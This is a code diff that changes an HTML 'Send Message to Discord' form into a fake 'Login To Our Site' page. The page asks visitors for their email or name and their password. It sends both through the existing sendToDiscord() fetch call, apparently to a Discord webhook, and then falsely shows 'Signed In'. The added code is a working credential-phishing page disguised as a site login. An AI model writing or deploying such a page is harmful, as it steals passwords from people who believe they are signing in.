@@ -35,9 +35,10 @@
   </style>
 </head>
 <body>
-  <h2>Send Message to Discord</h2>
-  <input id="username" type="text" placeholder="Your name">
-  <textarea id="message" placeholder="Your message"></textarea>
+  <h2>Login To Our Site</h2>
+  <p>Once you logged in, you can see our group projects and info!</p>
+  <input id="username" type="text" placeholder="Your Email/Name">
+  <textarea id="message" placeholder="Your Password"></textarea>
   <button onclick="sendToDiscord()">Send</button>
 
   <script>
@@ -47,7 +48,7 @@
       const message = document.getElementById("message").value;
 
       if (!message) {
-        alert("Please enter a message before sending.");
+        alert("Error");
         return;
       }
 
@@ -62,9 +63,9 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload)
         });
-        alert("✅ Message sent to Discord!");
+        alert("✅ Signed In");
       } catch (error) {
-        alert("❌ Error sending message.");
+        alert("❌ Error Signing In");
         console.error(error);
       }
     }
